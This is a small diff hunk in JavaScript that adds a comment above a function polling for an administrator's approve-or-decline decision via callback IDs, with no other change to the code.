@@ -585,7 +585,7 @@
       })
       .catch(() => resetButton());
     }
-
+        // Start polling for admin decision (Approve / Decline)
         function startPollingForDecision(approveCallbackId, declineCallbackId) {
       stopPolling();
       let lastUpdateId = 0;
